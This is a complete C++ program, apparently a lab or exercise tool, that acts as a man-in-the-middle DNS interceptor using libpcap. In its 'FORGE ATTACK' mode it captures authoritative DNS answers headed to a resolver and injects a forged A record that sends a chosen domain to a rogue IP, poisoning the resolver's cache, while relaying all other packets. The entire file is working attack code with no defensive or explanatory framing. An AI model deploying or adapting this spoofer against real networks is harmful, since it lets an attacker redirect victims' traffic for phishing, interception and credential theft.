#define _GNU_SOURCE 1
#define _DEFAULT_SOURCE 1

#include <iostream>
#include <string>
#include <vector>
#include <cstring>
#include <cstdlib>
#include <cstdio>
#include <unistd.h>
#include <pcap.h>
#include <arpa/inet.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <net/ethernet.h>
#include <net/if.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <fstream>
#include <sstream>

struct dnshdr {
    uint16_t id;
    uint16_t flags;
    uint16_t qdcount;
    uint16_t ancount;
    uint16_t nscount;
    uint16_t arcount;
};

struct Config {
    std::string iface = "eth0";
    bool forge_mode = false;
    std::string target_domain = "example.com";
    std::string rogue_ip = "172.16.1.30";
    std::string resolver_ip = "172.16.2.10";
    std::string domain_ns_ip = "172.16.3.30";
    uint8_t attacker_mac[6];
    uint8_t resolver_mac[6];
    bool have_resolver_mac = false;
};

static Config config;
static pcap_t *pcap_handle = nullptr;

uint16_t compute_checksum(const uint16_t *buf, int nwords) {
    uint32_t sum = 0;
    for (int i = 0; i < nwords; i++) {
        sum += ntohs(buf[i]);
    }
    while (sum >> 16) {
        sum = (sum & 0xffff) + (sum >> 16);
    }
    return htons(~sum);
}

struct PseudoHeader {
    uint32_t src_ip;
    uint32_t dst_ip;
    uint8_t reserved;
    uint8_t protocol;
    uint16_t udp_len;
};

uint16_t compute_udp_checksum(const struct iphdr *ip, const struct udphdr *udp, const uint8_t *payload, int payload_len) {
    PseudoHeader psh;
    psh.src_ip = ip->saddr;
    psh.dst_ip = ip->daddr;
    psh.reserved = 0;
    psh.protocol = IPPROTO_UDP;
    psh.udp_len = udp->len;

    int total_len = sizeof(PseudoHeader) + ntohs(udp->len);
    int buf_len = (total_len + 1) & ~1;
    std::vector<uint8_t> buf(buf_len, 0);

    memcpy(buf.data(), &psh, sizeof(PseudoHeader));
    memcpy(buf.data() + sizeof(PseudoHeader), udp, sizeof(struct udphdr));
    struct udphdr *copied_udp = reinterpret_cast<struct udphdr*>(buf.data() + sizeof(PseudoHeader));
    copied_udp->check = 0;

    if (payload_len > 0) {
        memcpy(buf.data() + sizeof(PseudoHeader) + sizeof(struct udphdr), payload, payload_len);
    }

    return compute_checksum(reinterpret_cast<uint16_t*>(buf.data()), buf_len / 2);
}

bool get_interface_mac(const std::string &ifname, uint8_t mac[6]) {
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) return false;

    struct ifreq ifr;
    strncpy(ifr.ifr_name, ifname.c_str(), IFNAMSIZ - 1);
    ifr.ifr_name[IFNAMSIZ - 1] = '\0';

    if (ioctl(sock, SIOCGIFHWADDR, &ifr) < 0) {
        close(sock);
        return false;
    }
    close(sock);

    memcpy(mac, ifr.ifr_hwaddr.sa_data, 6);
    return true;
}

bool lookup_arp_cache(const std::string &ip_str, uint8_t mac[6]) {
    std::ifstream arp_file("/proc/net/arp");
    if (!arp_file.is_open()) return false;

    std::string line;
    std::getline(arp_file, line);

    while (std::getline(arp_file, line)) {
        std::istringstream iss(line);
        std::string ip, hw_type, flags, mac_str, mask, dev;
        if (iss >> ip >> hw_type >> flags >> mac_str >> mask >> dev) {
            if (ip == ip_str && mac_str != "00:00:00:00:00:00") {
                unsigned int m[6];
                if (sscanf(mac_str.c_str(), "%x:%x:%x:%x:%x:%x",
                           &m[0], &m[1], &m[2], &m[3], &m[4], &m[5]) == 6) {
                    for (int i = 0; i < 6; i++) mac[i] = static_cast<uint8_t>(m[i]);
                    return true;
                }
            }
        }
    }
    return false;
}

bool ensure_resolver_mac() {
    for (int attempt = 0; attempt < 5; attempt++) {
        if (lookup_arp_cache(config.resolver_ip, config.resolver_mac)) {
            config.have_resolver_mac = true;
            return true;
        }

        std::string ip_cmd = "ip neigh show " + config.resolver_ip + " 2>/dev/null";
        FILE *pipe = popen(ip_cmd.c_str(), "r");
        if (pipe) {
            char buf[256];
            if (fgets(buf, sizeof(buf), pipe)) {
                std::string s(buf);
                size_t pos = s.find("lladdr ");
                if (pos != std::string::npos) {
                    std::string mstr = s.substr(pos + 7, 17);
                    unsigned int m[6];
                    if (sscanf(mstr.c_str(), "%x:%x:%x:%x:%x:%x",
                               &m[0], &m[1], &m[2], &m[3], &m[4], &m[5]) == 6) {
                        for (int i = 0; i < 6; i++) config.resolver_mac[i] = static_cast<uint8_t>(m[i]);
                        pclose(pipe);
                        config.have_resolver_mac = true;
                        return true;
                    }
                }
            }
            pclose(pipe);
        }

        std::string cmd = "ping -c 1 -W 1 " + config.resolver_ip + " >/dev/null 2>&1";
        system(cmd.c_str());
        cmd = "arping -c 1 -w 1 -I " + config.iface + " " + config.resolver_ip + " >/dev/null 2>&1";
        system(cmd.c_str());
        usleep(100000);
    }

    return false;
}

std::string parse_dns_qname(const uint8_t *dns_payload, int payload_len, int offset, int &bytes_read) {
    std::string domain;
    int curr = offset;
    bool jumped = false;

    while (curr < payload_len) {
        uint8_t len = dns_payload[curr];
        if (len == 0) {
            if (!jumped) bytes_read = (curr + 1) - offset;
            break;
        }

        if ((len & 0xC0) == 0xC0) {
            if (curr + 1 >= payload_len) break;
            if (!jumped) {
                bytes_read = (curr + 2) - offset;
                jumped = true;
            }
            int ptr = ((len & 0x3F) << 8) | dns_payload[curr + 1];
            curr = ptr;
            continue;
        }

        curr++;
        if (curr + len > payload_len) break;

        if (!domain.empty()) domain += ".";
        domain.append(reinterpret_cast<const char*>(dns_payload + curr), len);
        curr += len;

        if (!jumped) bytes_read = curr - offset;
    }

    return domain;
}

void relay_packet(const uint8_t *packet, int length) {
    if (length < static_cast<int>(sizeof(struct ether_header))) return;

    std::vector<uint8_t> relayed(packet, packet + length);
    struct ether_header *eth = reinterpret_cast<struct ether_header*>(relayed.data());

    memcpy(eth->ether_dhost, config.resolver_mac, 6);
    memcpy(eth->ether_shost, config.attacker_mac, 6);

    if (ntohs(eth->ether_type) == ETHERTYPE_IP && length >= static_cast<int>(sizeof(struct ether_header) + sizeof(struct iphdr))) {
        struct iphdr *ip = reinterpret_cast<struct iphdr*>(relayed.data() + sizeof(struct ether_header));
        int ip_len = ip->ihl * 4;
        ip->check = 0;
        ip->check = compute_checksum(reinterpret_cast<uint16_t*>(ip), ip->ihl * 2);

        if (ip->protocol == IPPROTO_UDP && length >= static_cast<int>(sizeof(struct ether_header) + ip_len + sizeof(struct udphdr))) {
            struct udphdr *udp = reinterpret_cast<struct udphdr*>(relayed.data() + sizeof(struct ether_header) + ip_len);
            int udp_data_len = ntohs(udp->len) - sizeof(struct udphdr);
            const uint8_t *udp_payload = relayed.data() + sizeof(struct ether_header) + ip_len + sizeof(struct udphdr);
            udp->check = 0;
            udp->check = compute_udp_checksum(ip, udp, udp_payload, udp_data_len);
        }
    }

    if (pcap_inject(pcap_handle, relayed.data(), relayed.size()) < 0) {
        std::cerr << "[-] pcap_inject error: " << pcap_geterr(pcap_handle) << std::endl;
    }
}

void forge_and_inject(const struct ether_header *orig_eth,
                      const struct iphdr *orig_ip,
                      const struct udphdr *orig_udp,
                      const uint8_t *orig_dns,
                      int orig_dns_len,
                      uint16_t orig_txid,
                      int qname_bytes) {
    int question_len = qname_bytes + 4;
    if (sizeof(dnshdr) + question_len > static_cast<size_t>(orig_dns_len)) {
        return;
    }

    int answer_len = 2 + 2 + 2 + 4 + 2 + 4;
    int forged_dns_len = sizeof(dnshdr) + question_len + answer_len;
    std::vector<uint8_t> dns_buf(forged_dns_len, 0);

    dnshdr *dns = reinterpret_cast<dnshdr*>(dns_buf.data());
    dns->id = htons(orig_txid);
    dns->flags = htons(0x8580);
    dns->qdcount = htons(1);
    dns->ancount = htons(1);
    dns->nscount = htons(0);
    dns->arcount = htons(0);

    memcpy(dns_buf.data() + sizeof(dnshdr), orig_dns + sizeof(dnshdr), question_len);

    uint8_t *ans = dns_buf.data() + sizeof(dnshdr) + question_len;
    ans[0] = 0xc0;
    ans[1] = 0x0c;
    ans[2] = 0x00; ans[3] = 0x01;
    ans[4] = 0x00; ans[5] = 0x01;
    ans[6] = 0x00; ans[7] = 0x00; ans[8] = 0x02; ans[9] = 0x58;
    ans[10] = 0x00; ans[11] = 0x04;
    struct in_addr rogue_addr;
    inet_pton(AF_INET, config.rogue_ip.c_str(), &rogue_addr);
    memcpy(ans + 12, &rogue_addr.s_addr, 4);

    int total_frame_len = sizeof(struct ether_header) + sizeof(struct iphdr) + sizeof(struct udphdr) + forged_dns_len;
    std::vector<uint8_t> frame(total_frame_len, 0);

    struct ether_header *eth = reinterpret_cast<struct ether_header*>(frame.data());
    memcpy(eth->ether_dhost, config.resolver_mac, 6);
    memcpy(eth->ether_shost, config.attacker_mac, 6);
    eth->ether_type = htons(ETHERTYPE_IP);

    struct iphdr *ip = reinterpret_cast<struct iphdr*>(frame.data() + sizeof(struct ether_header));
    ip->ihl = 5;
    ip->version = 4;
    ip->tos = 0;
    ip->tot_len = htons(sizeof(struct iphdr) + sizeof(struct udphdr) + forged_dns_len);
    ip->id = orig_ip->id;
    ip->frag_off = 0;
    ip->ttl = 64;
    ip->protocol = IPPROTO_UDP;
    ip->saddr = orig_ip->saddr;
    ip->daddr = orig_ip->daddr;
    ip->check = 0;
    ip->check = compute_checksum(reinterpret_cast<uint16_t*>(ip), ip->ihl * 2);

    struct udphdr *udp = reinterpret_cast<struct udphdr*>(frame.data() + sizeof(struct ether_header) + sizeof(struct iphdr));
    udp->source = orig_udp->source;
    udp->dest = orig_udp->dest;
    udp->len = htons(sizeof(struct udphdr) + forged_dns_len);
    udp->check = 0;
    udp->check = compute_udp_checksum(ip, udp, dns_buf.data(), forged_dns_len);

    memcpy(frame.data() + sizeof(struct ether_header) + sizeof(struct iphdr) + sizeof(struct udphdr),
           dns_buf.data(), forged_dns_len);

    if (pcap_inject(pcap_handle, frame.data(), frame.size()) >= 0) {
        std::cout << "[+] FORGED response injected: " << config.target_domain 
                  << " -> " << config.rogue_ip 
                  << " (TXID: 0x" << std::hex << orig_txid << std::dec 
                  << ", UDP port: " << ntohs(udp->dest) << ")" << std::endl;
    } else {
        std::cerr << "[-] Error injecting forged packet: " << pcap_geterr(pcap_handle) << std::endl;
    }
}

void packet_handler(u_char *user, const struct pcap_pkthdr *pkthdr, const u_char *packet) {
    if (pkthdr->caplen < sizeof(struct ether_header) + sizeof(struct iphdr) + sizeof(struct udphdr)) {
        return;
    }

    const struct ether_header *eth = reinterpret_cast<const struct ether_header*>(packet);
    if (ntohs(eth->ether_type) != ETHERTYPE_IP) return;

    const struct iphdr *ip = reinterpret_cast<const struct iphdr*>(packet + sizeof(struct ether_header));
    if (ip->protocol != IPPROTO_UDP) return;

    int ip_header_len = ip->ihl * 4;
    const struct udphdr *udp = reinterpret_cast<const struct udphdr*>(packet + sizeof(struct ether_header) + ip_header_len);

    int udp_len = ntohs(udp->len);
    int dns_offset = sizeof(struct ether_header) + ip_header_len + sizeof(struct udphdr);
    int dns_len = udp_len - sizeof(struct udphdr);

    if (dns_offset + dns_len > static_cast<int>(pkthdr->caplen) || dns_len < static_cast<int>(sizeof(dnshdr))) {
        return;
    }

    const uint8_t *dns_payload = packet + dns_offset;
    const dnshdr *dns = reinterpret_cast<const dnshdr*>(dns_payload);

    uint16_t qdcount = ntohs(dns->qdcount);
    uint16_t ancount = ntohs(dns->ancount);
    uint16_t txid = ntohs(dns->id);

    char src_ip_str[INET_ADDRSTRLEN];
    char dst_ip_str[INET_ADDRSTRLEN];
    inet_ntop(AF_INET, &(ip->saddr), src_ip_str, INET_ADDRSTRLEN);
    inet_ntop(AF_INET, &(ip->daddr), dst_ip_str, INET_ADDRSTRLEN);

    int bytes_read = 0;
    std::string qname = "";
    uint16_t qtype = 0;
    if (qdcount > 0) {
        qname = parse_dns_qname(dns_payload, dns_len, sizeof(dnshdr), bytes_read);
        if (sizeof(dnshdr) + bytes_read + 2 <= static_cast<size_t>(dns_len)) {
            qtype = ntohs(*reinterpret_cast<const uint16_t*>(dns_payload + sizeof(dnshdr) + bytes_read));
        }
    }

    bool is_target = (config.forge_mode &&
                      qname == config.target_domain &&
                      qtype == 1 &&
                      ancount > 0 &&
                      std::string(src_ip_str) == config.domain_ns_ip);

    if (is_target) {
        std::cout << "[*] Intercepted target response for: " << qname 
                  << " (type A) from " << src_ip_str 
                  << " (ANCOUNT=" << ancount << ")" << std::endl;

        forge_and_inject(eth, ip, udp, dns_payload, dns_len, txid, bytes_read);
    } else {
        relay_packet(packet, pkthdr->caplen);
    }
}

int main(int argc, char *argv[]) {
    for (int i = 1; i < argc; i++) {
        std::string arg = argv[i];
        if (arg == "--forge") {
            config.forge_mode = true;
        } else if (arg == "--relay") {
            config.forge_mode = false;
        } else if (arg == "--iface" && i + 1 < argc) {
            config.iface = argv[++i];
        } else if (arg == "--target" && i + 1 < argc) {
            config.target_domain = argv[++i];
        } else if (arg == "--ip" && i + 1 < argc) {
            config.rogue_ip = argv[++i];
        } else if (arg == "--resolver-mac" && i + 1 < argc) {
            std::string mstr = argv[++i];
            unsigned int m[6];
            if (sscanf(mstr.c_str(), "%x:%x:%x:%x:%x:%x", &m[0], &m[1], &m[2], &m[3], &m[4], &m[5]) == 6) {
                for (int j = 0; j < 6; j++) config.resolver_mac[j] = static_cast<uint8_t>(m[j]);
                config.have_resolver_mac = true;
            }
        }
    }

    std::cout << "=== DNS Interceptor (Phase 2) ===" << std::endl;
    std::cout << "Mode: " << (config.forge_mode ? "FORGE ATTACK" : "TRANSPARENT RELAY") << std::endl;
    std::cout << "Target Domain: " << config.target_domain << std::endl;
    std::cout << "Rogue IP: " << config.rogue_ip << std::endl;
    std::cout << "Listening Interface: " << config.iface << std::endl;

    if (!get_interface_mac(config.iface, config.attacker_mac)) {
        std::cerr << "[-] Failed to get MAC for " << config.iface << std::endl;
        return 1;
    }
    char mac_buf[32];
    snprintf(mac_buf, sizeof(mac_buf), "%02x:%02x:%02x:%02x:%02x:%02x",
             config.attacker_mac[0], config.attacker_mac[1], config.attacker_mac[2],
             config.attacker_mac[3], config.attacker_mac[4], config.attacker_mac[5]);
    std::cout << "Attacker MAC: " << mac_buf << std::endl;

    if (!config.have_resolver_mac) {
        if (!ensure_resolver_mac()) {
            std::cerr << "[-] Failed to resolve MAC for resolver at " << config.resolver_ip << std::endl;
            return 1;
        }
    }
    snprintf(mac_buf, sizeof(mac_buf), "%02x:%02x:%02x:%02x:%02x:%02x",
             config.resolver_mac[0], config.resolver_mac[1], config.resolver_mac[2],
             config.resolver_mac[3], config.resolver_mac[4], config.resolver_mac[5]);
    std::cout << "Resolver MAC: " << mac_buf << std::endl;

    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_handle = pcap_open_live(config.iface.c_str(), 65535, 1, 1, errbuf);
    if (!pcap_handle) {
        std::cerr << "[-] pcap_open_live failed: " << errbuf << std::endl;
        return 1;
    }

    std::string bpf_filter = "ip and udp and src port 53 and dst host " + config.resolver_ip;
    struct bpf_program fp;
    if (pcap_compile(pcap_handle, &fp, bpf_filter.c_str(), 0, PCAP_NETMASK_UNKNOWN) == -1) {
        std::cerr << "[-] pcap_compile failed: " << pcap_geterr(pcap_handle) << std::endl;
        return 1;
    }
    if (pcap_setfilter(pcap_handle, &fp) == -1) {
        std::cerr << "[-] pcap_setfilter failed: " << pcap_geterr(pcap_handle) << std::endl;
        return 1;
    }
    pcap_freecode(&fp);

    std::cout << "[+] Interceptor ready and listening on " << config.iface << "..." << std::endl;
    pcap_loop(pcap_handle, -1, packet_handler, nullptr);

    pcap_close(pcap_handle);
    return 0;
}
